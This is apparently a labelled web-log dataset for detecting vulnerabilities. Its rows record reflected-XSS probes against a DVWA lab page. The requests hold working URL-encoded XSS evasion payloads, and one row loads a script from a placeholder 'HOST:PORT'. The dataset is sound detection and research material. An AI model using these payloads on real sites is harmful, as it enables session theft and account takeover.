ip,identity,user,timestamp,request,status,size,referer,user_agent,vulnerability,method,url,protocol,request_length,url_parts,user_agent_length,Predicted_Vulnerability
12.12.12.11,-,-,2024-07-01 15:47:18-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20onxxx%3D1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1711,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onxxx%3D1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,107,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:20-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cX%20onxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1710,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cX%20onxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,107,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:22-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20OnXxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1711,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20OnXxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,107,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:23-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cX%20OnXxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1711,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cX%20OnXxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,107,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:25-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20onxxx%3d1%20onxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1713,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onxxx%3d1%20onxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,119,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:26-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%2fonxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1711,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%2fonxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,107,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:28-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%09onxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1711,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%09onxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,107,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:30-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%0Aonxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1711,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%0Aonxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,107,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:31-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%0Conxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1711,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%0Conxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,107,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:33-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%0Donxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1711,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%0Donxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,107,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:35-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%2Fonxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1711,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%2Fonxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,107,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:37-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%201%3d'1'onxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1715,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%201%3d'1'onxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,114,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:38-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%201%3d%221%22onxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1715,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%201%3d%221%22onxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,118,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:40-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20%3c%2fonxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1712,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20%3c%2fonxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,113,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:42-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%201%3d%22%3e%22%20onxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1715,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%201%3d%22%3e%22%20onxxx%3d1&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,123,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:44-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3chttp%3a%2f%2fonxxx%3D1%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1712,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3chttp%3a%2f%2fonxxx%3D1%2f&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,119,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:46-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cx%20onxxx%3dalert(1)%201%3d'&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1718,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cx%20onxxx%3dalert(1)%201%3d'&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,122,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:47-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%3csvg%20onload%3dsetInterval(function()%7bwith(document)body%2eappendChild(createElement('script'))%2esrc%3d'%2f%2fHOST%3aPORT'%7d,0)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1785,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%3csvg%20onload%3dsetInterval(function()%7bwith(document)body%2eappendChild(createElement('script'))%2esrc%3d'%2f%2fHOST%3aPORT'%7d,0)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,228,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:49-04:00,GET /DVWA/vulnerabilities/xss_r/?name='onload%3dalert(1)%3e%3csvg%2f1%3d'&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1720,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name='onload%3dalert(1)%3e%3csvg%2f1%3d'&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,126,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:51-04:00,GET /DVWA/vulnerabilities/xss_r/?name='%3ealert(1)%3c%2fscript%3e%3cscript%2f1%3d'&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1718,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name='%3ealert(1)%3c%2fscript%3e%3cscript%2f1%3d'&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,135,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:53-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%2a%2falert(1)%3c%2fscript%3e%3cscript%3e%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1717,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%2a%2falert(1)%3c%2fscript%3e%3cscript%3e%2f%2a&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,138,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:55-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%2a%2falert(1)%22%3e'onload%3d%22%2f%2a%3csvg%2f1%3d'&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1725,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%2a%2falert(1)%22%3e'onload%3d%22%2f%2a%3csvg%2f1%3d'&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,144,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:57-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%60-alert(1)%22%3e'onload%3d%22%60%3csvg%2f1%3d'&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1725,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%60-alert(1)%22%3e'onload%3d%22%60%3csvg%2f1%3d'&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,139,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:47:59-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%2a%2f%3c%2fscript%3e'%3ealert(1)%2f%2a%3cscript%2f1%3d'&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1722,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%2a%2f%3c%2fscript%3e'%3ealert(1)%2f%2a%3cscript%2f1%3d'&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,147,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:01-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(1)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1713,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%3ealert(1)%3c%2fscript%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,126,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:03-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1713,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cscript%20src%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,133,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:05-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ciframe%20src%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1718,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ciframe%20src%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,133,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:07-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cembed%20src%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1717,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cembed%20src%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,132,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:09-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3djavascript%3aalert(1)%3eclick&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1718,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ca%20href%3djavascript%3aalert(1)%3eclick&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,134,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:11-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cmath%3e%3cbrute%20href%3djavascript%3aalert(1)%3eclick&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cmath%3e%3cbrute%20href%3djavascript%3aalert(1)%3eclick&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,148,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:13-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cform%20action%3djavascript%3aalert(1)%3e%3cinput%20type%3dsubmit%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1720,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cform%20action%3djavascript%3aalert(1)%3e%3cinput%20type%3dsubmit%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,161,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:15-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cisindex%20action%3djavascript%3aalert(1)%20type%3dsubmit%20value%3dclick%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1728,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cisindex%20action%3djavascript%3aalert(1)%20type%3dsubmit%20value%3dclick%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,169,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:17-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cbutton%20formaction%3djavascript%3aalert(1)%3eclick&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1724,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cbutton%20formaction%3djavascript%3aalert(1)%3eclick&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,155,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:19-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cinput%20formaction%3djavascript%3aalert(1)%20type%3dsubmit%20value%3dclick%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1728,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cinput%20formaction%3djavascript%3aalert(1)%20type%3dsubmit%20value%3dclick%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,181,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:21-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cinput%20formaction%3djavascript%3aalert(1)%20type%3dimage%20value%3dclick%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1729,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cinput%20formaction%3djavascript%3aalert(1)%20type%3dimage%20value%3dclick%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,180,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:23-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cinput%20formaction%3djavascript%3aalert(1)%20type%3dimage%20src%3dSOURCE%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1730,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cform%3e%3cinput%20formaction%3djavascript%3aalert(1)%20type%3dimage%20src%3dSOURCE%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,179,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:25-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cisindex%20formaction%3djavascript%3aalert(1)%20type%3dsubmit%20value%3dclick%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1730,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cisindex%20formaction%3djavascript%3aalert(1)%20type%3dsubmit%20value%3dclick%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,173,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:28-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3cobject%20data%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1719,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3cobject%20data%3djavascript%3aalert(1)%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,134,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:30-04:00,GET /DVWA/vulnerabilities/xss_r/?name=%3ciframe%20srcdoc%3d%3csvg%2fo%26%23x6Eload%26equals%3balert%26lpar%3b1)%26gt%3b%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1,200,1745,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,/DVWA/vulnerabilities/xss_r/?name=%3ciframe%20srcdoc%3d%3csvg%2fo%26%23x6Eload%26equals%3balert%26lpar%3b1)%26gt%3b%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5,HTTP/1.1,175,5,116,XSS
12.12.12.11,-,-,2024-07-01 15:48:32-04:00,"GET /DVWA/vulnerabilities/xss_r/?name=%3csvg%3e%3cscript%20xlink%3ahref%3ddata%3a,alert(1)%20%2f%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5 HTTP/1.1",200,1727,http://12.12.12.11/DVWA/vulnerabilities/xss_r/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36",XSS,GET,"/DVWA/vulnerabilities/xss_r/?name=%3csvg%3e%3cscript%20xlink%3ahref%3ddata%3a,alert(1)%20%2f%3e&user_token=9f6911951c8b8d903fd5b7a9834a6ae5",HTTP/1.1,152,5,116,XSS
